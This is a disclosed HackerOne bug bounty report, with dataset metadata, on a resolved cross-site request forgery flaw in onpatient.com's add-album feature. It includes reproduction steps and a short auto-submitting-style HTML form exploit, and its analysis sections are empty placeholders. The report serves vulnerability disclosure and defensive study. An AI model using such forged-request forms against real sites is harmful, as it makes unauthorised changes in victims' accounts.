---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '99647'
original_report_id: '99647'
title: CSRF  Add Album On  onpatient.com
weakness: Cross-Site Request Forgery (CSRF)
team_handle: drchrono
created_at: '2015-11-14T12:15:29.158Z'
disclosed_at: '2016-08-31T04:44:13.907Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 3
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# CSRF  Add Album On  onpatient.com

## Metadata

- HackerOne Report ID: 99647
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: drchrono
- Disclosed At: 2016-08-31T04:44:13.907Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

**Hi**

I'm  Found  Bug CSRF It is Possible To Add  Album  By Attacker on onpatient.com 

Steps to verify
----
* . Login as attacker 
* . Go to  photos and  click  **add album**
* . rename  album for example :- **hacking** . 
* . intercept this request add using burp proxy or any other tool  (you can see **X-CSRFToken**  and  **sessionid**)  attacker can add request  on post  without  **X-CSRFToken**
* . Create  Form HTML  Exploit   **Add album**
* . Send to **Victim User**

Form Exploitation 
---
~~~
<html>
<body>
<form action="https://onpatient.com/photos/add_album/" method="POST">
<input type="hidden" name="name" value="hacking" />
<input type="submit" value="Add album Hacking" />
</form>
</body>
</html>
~~~
**Response** :- {"album": idalbum, "success": true} 




**Regards**
**Hussain**

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
